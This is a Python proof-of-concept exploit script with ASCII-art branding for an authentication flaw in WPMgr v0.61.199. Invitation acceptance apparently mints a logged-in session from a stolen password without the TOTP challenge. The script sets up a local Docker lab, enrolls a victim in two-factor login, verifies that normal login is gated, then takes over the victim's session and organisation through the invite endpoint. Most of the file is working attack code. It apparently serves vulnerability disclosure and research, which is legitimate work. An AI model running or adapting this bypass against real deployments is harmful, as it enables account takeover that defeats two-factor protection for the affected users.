#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Mail    : abraxas.null@proton.me
#
#  CVE: wpmgr-invite-skip-2fa (High: 8.1)
#  Vendor: WPMgr (mosamlife)
#  Versions: WPMgr v0.61.199
#  Impact: invitation accept mints a session with stolen password and no TOTP
#  Requires: Docker, git, python3; loopback compose clones mosamlife/wpmgr at e1b3a163
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "wpmgr-invite-skip-2fa"
_EMAIL = "abraxas.null@proton.me"

_RST = "\033[0m"
_BLD = "\033[1m"
_CYAN = (0, 255, 249)
_MAGENTA = (255, 0, 212)
_PINK = (255, 77, 224)
_GREEN = (57, 255, 20)
_GOLD = (255, 230, 0)
_AMBER = (255, 201, 70)
_RED = (255, 64, 96)
_MUTED = (140, 155, 175)
_INK = (232, 255, 248)
_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    if not _on():
        return ""
    return f"\033[38;2;{r};{g};{b}m"


def _paint(text, rgb, bold=False):
    if not text or rgb is None:
        return text or ""
    prefix = _rgb(*rgb) + (_BLD if bold else "")
    return "".join(ch if ch == " " else prefix + ch for ch in text)


def _box(inner, border):
    edge = _rgb(*border) + "║" + _RST
    return edge + " " + inner + _RST + " " + edge


def _rule(left, right, border, width):
    return _rgb(*border) + left + "═" * (width - 2) + right + _RST


def _split(text, left_end, right_start, left_rgb, right_rgb, mid_rgb=None, left_bold=False):
    return (
        _paint(text[:left_end], left_rgb, bold=left_bold)
        + _paint(text[left_end:right_start], mid_rgb)
        + _paint(text[right_start:], right_rgb)
    )


def _fit(left, right, width, fill=" "):
    gap = max(width - len(left) - len(right), 1)
    return (left + fill * gap + right)[:width].ljust(width)


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line):
    width = max(len(line), 1)
    out = []
    quoted = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        quoted ^= ch == '"'
        if ch == '"':
            color = _AMBER if quoted else _GOLD
        elif quoted:
            color = _GOLD
        else:
            color = _rain(x, width)
        out.append(_rgb(*color) + ch)
    return "".join(out) + _RST


def _banner_width(cols):
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(row) for row in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    return content_w, box_w


def _title_row(width):
    left, right = " ABRAXAS LABS", "analyze · reverse · disclose"
    text = _fit(left, right, width)
    return _split(text, len(left), width - len(right), _CYAN, _MUTED, left_bold=True)


def _cve_row(width):
    left, right = " " + _CVE, "authorized research only"
    rest = max(width - len(left) - len(right), 3)
    text = (left + " local lab ".center(rest)[:rest] + right)[:width].ljust(width)
    return _split(text, len(left), width - len(right), _PINK, _GREEN, mid_rgb=_MAGENTA, left_bold=True)


def _mail_row(width):
    left, right = " Mail", _EMAIL
    text = _fit(left, right, width)
    return _split(text, len(left), width - len(right), _GOLD, _CYAN)


def _status_line():
    marks = {"[": _GREEN, "]": _GREEN, "*": _GREEN, "·": _PINK, "#": _PINK}
    text = "[*]  abraxas!null ready on #labs"
    return "".join(ch if ch == " " else _rgb(*marks.get(ch, _INK)) + ch for ch in text) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    content_w, box_w = _banner_width(cols)
    lines = [
        _rule("╔", "╗", _CYAN, box_w),
        _box(_title_row(content_w) + _RST, _CYAN),
        _rule("╠", "╣", _MAGENTA, box_w),
        _box(_cve_row(content_w) + _RST, _MAGENTA),
        _rule("╠", "╣", _MAGENTA, box_w),
    ]
    for glyph in _ART["abraxas"] + _ART["labs"]:
        vis = glyph[:content_w].ljust(content_w)
        lines.append(_box(_logo_line(vis), _MAGENTA))
    lines.extend([
        _rule("╠", "╣", _MAGENTA, box_w),
        _box(_mail_row(content_w) + _RST, _MAGENTA),
        _rule("╚", "╝", _CYAN, box_w),
        " " + _status_line(),
    ])
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _message_color(s):
    low = s.lower()
    stripped = s.lstrip()
    if low.startswith("success"):
        return _rgb(*_GREEN) + _BLD
    if low.startswith("fail"):
        return _rgb(*_RED) + _BLD
    if "user_id" in low:
        return _rgb(*_AMBER) + _BLD
    if low.startswith("status=") or "status=" in low[:20]:
        return _rgb(*_CYAN)
    if low.startswith("carrier"):
        return _rgb(*_MAGENTA)
    if stripped[:1] in "{[":
        return _rgb(*_GOLD)
    return _rgb(*_INK)


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    dest = kwargs.get("file", _sys.stdout)
    if dest is not _sys.stdout and dest is not _sys.stderr:
        _builtins.print(*args, **kwargs)
        return
    extra = {k: v for k, v in kwargs.items() if k != "sep"}
    _builtins.print(_message_color(s) + s + _RST, **extra)

print_abraxas_banner()
_builtins.print = _cprint

"""Witness-only lab: invitation accept mints a session without the 2FA challenge."""

import base64
import hashlib
import hmac
import http.cookiejar
import json
import os
import re
import struct
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass
from pathlib import Path
from typing import Any

LABEL = "WPMGR-H05-INVITE-2FA"
WITNESS = "WPMGR-H05-SESSION-WITHOUT-2FA"
API = os.environ.get("WPMGR_API_URL", "http://127.0.0.1:18191").rstrip("/")
MAILPIT = os.environ.get("WPMGR_MAILPIT_URL", "http://127.0.0.1:18195").rstrip("/")
COMPOSE = os.environ.get("COMPOSE_PROJECT_NAME", "wpmgrh05")
HERE = Path(__file__).resolve().parent
CLAIM = os.environ.get("WPMGR_BOOTSTRAP_CLAIM", "wpmgr-h05-bootstrap-claim-lab-only")
OWNER_EMAIL = "owner@example.com"
OWNER_PASS = "OwnerPass12!!"
VICTIM_EMAIL = "victim@example.com"
VICTIM_PASS = "VictimPass12!!"
TOKEN_RE = re.compile(r"verify-email\?token=([A-Za-z0-9_-]+)")
INVITE_RE = re.compile(r"[?&]token=([A-Za-z0-9_-]+)")


@dataclass
class HttpResult:
    status: int
    body: str
    json: Any
    headers: dict[str, str]


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def success(detail: str) -> int:
    log(f"SUCCESS {LABEL} {detail} {WITNESS}")
    return 0


def snippet(text: str, limit: int = 180) -> str:
    return text.replace("\n", " ").replace("\r", " ")[:limit]


def totp_code(secret: str, when: int | None = None) -> str:
    pad = "=" * ((8 - len(secret) % 8) % 8)
    key = base64.b32decode(secret.upper() + pad, casefold=True)
    counter = int(time.time() if when is None else when) // 30
    digest = hmac.new(key, struct.pack(">Q", counter), hashlib.sha1).digest()
    offset = digest[-1] & 0x0F
    code = struct.unpack(">I", digest[offset : offset + 4])[0] & 0x7FFFFFFF
    return f"{code % 1_000_000:06d}"


def as_str(value: Any) -> str:
    if isinstance(value, str):
        return value
    if isinstance(value, dict) and isinstance(value.get("Value"), str):
        return value["Value"]
    return ""


def as_bool(value: Any) -> bool:
    if value is True:
        return True
    return isinstance(value, dict) and value.get("Value") is True


def tenant_id(payload: Any) -> str:
    if not isinstance(payload, dict):
        return ""
    active = as_str(payload.get("active_tenant_id"))
    if active:
        return active
    memberships = payload.get("memberships")
    if isinstance(memberships, list) and memberships:
        first = memberships[0]
        if isinstance(first, dict):
            return as_str(first.get("tenant_id"))
    return ""


def two_factor_required(payload: Any) -> bool:
    return isinstance(payload, dict) and payload.get("two_factor_required") is True


class Client:
    def __init__(self) -> None:
        self.jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.jar))

    def has_session(self) -> bool:
        return any(c.name == "wpmgr_session" and c.value for c in self.jar)

    def request(
        self,
        method: str,
        path: str,
        payload: dict[str, Any] | None = None,
        extra_headers: dict[str, str] | None = None,
        timeout: int = 60,
    ) -> HttpResult:
        url = path if path.startswith("http") else f"{API}{path}"
        headers = {"Accept": "application/json"}
        data = None
        if payload is not None:
            data = json.dumps(payload).encode("utf-8")
            headers["Content-Type"] = "application/json"
        if extra_headers:
            headers.update(extra_headers)
        req = urllib.request.Request(url, data=data, headers=headers, method=method)
        try:
            with self.opener.open(req, timeout=timeout) as resp:
                body = resp.read().decode("utf-8", errors="replace")
                status = resp.status
                raw_headers = {k.lower(): v for k, v in resp.headers.items()}
        except urllib.error.HTTPError as exc:
            body = exc.read().decode("utf-8", errors="replace")
            status = exc.code
            raw_headers = {k.lower(): v for k, v in exc.headers.items()} if exc.headers else {}
        except urllib.error.URLError as exc:
            return HttpResult(status=0, body=str(exc.reason), json=None, headers={})
        parsed: Any = None
        if body:
            try:
                parsed = json.loads(body)
            except json.JSONDecodeError:
                parsed = None
        return HttpResult(status=status, body=body, json=parsed, headers=raw_headers)


def mailpit_verify_token() -> str:
    opener = urllib.request.build_opener()
    try:
        with opener.open(f"{MAILPIT}/api/v1/messages", timeout=8) as resp:
            listing = json.loads(resp.read().decode("utf-8", errors="replace"))
    except (urllib.error.URLError, json.JSONDecodeError, TimeoutError):
        return ""
    messages = listing.get("messages") if isinstance(listing, dict) else None
    if not isinstance(messages, list):
        return ""
    for item in messages:
        if not isinstance(item, dict):
            continue
        msg_id = item.get("ID") or item.get("id")
        if not msg_id:
            continue
        try:
            with opener.open(f"{MAILPIT}/api/v1/message/{msg_id}", timeout=8) as resp:
                raw = resp.read().decode("utf-8", errors="replace")
        except (urllib.error.URLError, TimeoutError):
            continue
        match = TOKEN_RE.search(raw)
        if match:
            return match.group(1)
        try:
            payload = json.loads(raw)
        except json.JSONDecodeError:
            continue
        blob = json.dumps(payload)
        match = TOKEN_RE.search(blob)
        if match:
            return match.group(1)
    return ""


def river_verify_token() -> str:
    sql = (
        "SELECT args::text FROM river_job "
        "WHERE kind = 'send_email' ORDER BY id DESC LIMIT 8"
    )
    proc = subprocess.run(
        [
            "docker",
            "compose",
            "-p",
            COMPOSE,
            "-f",
            str(HERE / "docker-compose.yml"),
            "exec",
            "-T",
            "postgres",
            "psql",
            "-U",
            "wpmgr",
            "-d",
            "wpmgr",
            "-tAc",
            sql,
        ],
        cwd=HERE,
        check=False,
        text=True,
        capture_output=True,
        timeout=20,
    )
    match = TOKEN_RE.search(proc.stdout or "")
    return match.group(1) if match else ""


def wait_verify_token() -> str:
    token = ""
    for _ in range(24):
        token = mailpit_verify_token() or river_verify_token()
        if token:
            return token
        time.sleep(2)
    return token


def enroll_totp(client: Client) -> str | None:
    begin = client.request("POST", "/auth/2fa/totp/begin", {})
    if begin.status != 200 or not isinstance(begin.json, dict):
        log(f"IOC totp-begin status={begin.status} body={snippet(begin.body)}")
        return None
    secret = begin.json.get("secret")
    if not isinstance(secret, str) or not secret:
        log(f"IOC totp-begin-missing-secret status={begin.status}")
        return None
    last = ""
    for _ in range(4):
        confirm = client.request("POST", "/auth/2fa/totp/confirm", {"code": totp_code(secret)})
        last = f"status={confirm.status} body={snippet(confirm.body)}"
        if confirm.status == 200:
            status = client.request("GET", "/auth/2fa/status")
            enabled = isinstance(status.json, dict) and (
                as_bool(status.json.get("two_factor_enabled"))
                or as_bool(status.json.get("totp_enabled"))
            )
            if enabled:
                return secret
            me = client.request("GET", "/auth/me")
            user = me.json.get("user") if isinstance(me.json, dict) else None
            if isinstance(user, dict) and as_bool(user.get("two_factor_enabled")):
                return secret
            log(f"IOC totp-confirm-ok-not-enabled {last}")
            return None
        time.sleep(1)
    log(f"IOC totp-confirm-failed {last}")
    return None


def invite_token(owner: Client, email: str) -> str:
    invited = owner.request("POST", "/api/v1/members", {"email": email, "role": "viewer"})
    if invited.status not in {200, 201} or not isinstance(invited.json, dict):
        log(f"IOC invite-failed status={invited.status} body={snippet(invited.body)}")
        return ""
    link = invited.json.get("accept_link")
    if not isinstance(link, str) or not link:
        log(f"IOC invite-missing-link body={snippet(invited.body)}")
        return ""
    parsed = urllib.parse.urlparse(link)
    token = urllib.parse.parse_qs(parsed.query).get("token", [""])[0]
    if not token:
        match = INVITE_RE.search(link)
        token = match.group(1) if match else ""
    log(f"IOC invite status={invited.status} token_len={len(token)}")
    return token


def create_org(client: Client, name: str, slug: str) -> str:
    created = client.request("POST", "/api/v1/orgs", {"name": name, "slug": slug})
    if created.status not in {200, 201} or not isinstance(created.json, dict):
        log(f"IOC org-create-failed status={created.status} body={snippet(created.body)}")
        return ""
    org_id = created.json.get("id")
    return org_id if isinstance(org_id, str) else ""


def provision_victim(owner: Client) -> tuple[str, str]:
    """Return (victim_org_id, how) with TOTP already enrolled and session cleared."""
    registered = Client().request(
        "POST",
        "/auth/register",
        {
            "email": VICTIM_EMAIL,
            "password": VICTIM_PASS,
            "name": "Victim",
            "tenant_name": "Victim Org",
        },
    )
    log(f"IOC victim-register status={registered.status} body={snippet(registered.body)}")
    token = wait_verify_token()
    if token:
        victim = Client()
        verified = victim.request("POST", "/auth/verify-email", {"token": token})
        if verified.status != 200 or not victim.has_session():
            log(f"IOC victim-verify-failed status={verified.status} body={snippet(verified.body)}")
            return "", ""
        org_id = tenant_id(verified.json)
        if not org_id:
            me = victim.request("GET", "/auth/me")
            org_id = tenant_id(me.json)
        if not org_id:
            log("IOC victim-verify-no-org")
            return "", ""
        if enroll_totp(victim) is None:
            return "", ""
        victim.request("POST", "/auth/logout", {})
        log(f"IOC victim-verified-enrolled org_len={len(org_id)}")
        return org_id, "self-serve"
    log("IOC victim-verify-token-missing using-invite-fallback")
    token = invite_token(owner, VICTIM_EMAIL)
    if not token:
        return "", ""
    victim = Client()
    accepted = victim.request(
        "POST",
        "/api/v1/invitations/accept",
        {"token": token, "email": VICTIM_EMAIL, "password": VICTIM_PASS, "name": "Victim"},
    )
    if accepted.status != 200 or not victim.has_session():
        log(f"IOC victim-create-accept-failed status={accepted.status} body={snippet(accepted.body)}")
        return "", ""
    org_id = create_org(victim, "Victim Org", "victim-org")
    if not org_id:
        return "", ""
    if enroll_totp(victim) is None:
        return "", ""
    victim.request("POST", "/auth/logout", {})
    second = create_org(owner, "Owner Invite Org", "owner-invite-org")
    if not second:
        return "", ""
    activated = owner.request("POST", f"/api/v1/orgs/{second}/activate", {})
    if activated.status != 200:
        log(f"IOC owner-switch-failed status={activated.status} body={snippet(activated.body)}")
        return "", ""
    log(f"IOC victim-invite-created org_len={len(org_id)}")
    return org_id, "invite-fallback"


def main() -> int:
    owner = Client()
    boot = owner.request(
        "POST",
        "/auth/register",
        {
            "email": OWNER_EMAIL,
            "password": OWNER_PASS,
            "name": "Owner",
            "tenant_name": "Owner Org",
        },
        extra_headers={"X-Wpmgr-Bootstrap-Claim": CLAIM},
    )
    log(f"IOC bootstrap status={boot.status} session={owner.has_session()}")
    if boot.status not in {200, 201} or not owner.has_session():
        return fail(f"bootstrap-failed status={boot.status} body={snippet(boot.body)}")

    victim_org, how = provision_victim(owner)
    if not victim_org:
        return fail("victim-2fa-enroll-failed")
    log(f"IOC victim-ready via={how}")

    login_client = Client()
    gated = login_client.request(
        "POST", "/auth/login", {"email": VICTIM_EMAIL, "password": VICTIM_PASS}
    )
    log(
        "IOC login-password-only "
        f"status={gated.status} two_factor_required={two_factor_required(gated.json)} "
        f"session={login_client.has_session()}"
    )
    if gated.status != 202 or not two_factor_required(gated.json):
        return fail(
            f"login-gate-missing status={gated.status} body={snippet(gated.body)}"
        )

    token = invite_token(owner, VICTIM_EMAIL)
    if not token:
        return fail("invite-token-missing")

    takeover = Client()
    accepted = takeover.request(
        "POST",
        "/api/v1/invitations/accept",
        {"token": token, "email": VICTIM_EMAIL, "password": VICTIM_PASS},
    )
    log(
        "IOC accept-without-totp "
        f"status={accepted.status} two_factor_required={two_factor_required(accepted.json)} "
        f"session={takeover.has_session()} body={snippet(accepted.body)}"
    )
    if two_factor_required(accepted.json) or accepted.status == 202:
        return fail("accept-challenged-2fa leftover-closed")
    if accepted.status != 200 or not takeover.has_session():
        return fail(f"accept-no-session status={accepted.status} body={snippet(accepted.body)}")

    me = takeover.request("GET", "/auth/me")
    user = me.json.get("user") if isinstance(me.json, dict) else None
    email = as_str(user.get("email")) if isinstance(user, dict) else ""
    enabled = as_bool(user.get("two_factor_enabled")) if isinstance(user, dict) else False
    log(f"IOC accept-me status={me.status} email={email} two_factor_enabled={enabled}")
    if me.status != 200 or email != VICTIM_EMAIL:
        return fail(f"accept-session-not-victim status={me.status} body={snippet(me.body)}")

    activated = takeover.request("POST", f"/api/v1/orgs/{victim_org}/activate", {})
    log(f"IOC activate-victim-org status={activated.status} body={snippet(activated.body)}")
    if activated.status != 200:
        return fail(f"activate-failed status={activated.status} body={snippet(activated.body)}")
    active = ""
    if isinstance(activated.json, dict):
        active = str(activated.json.get("active_tenant_id") or "")
    if active and active != victim_org:
        return fail("activate-wrong-org")
    return success("invite-accept-skipped-2fa-session")


if __name__ == "__main__":
    raise SystemExit(main())

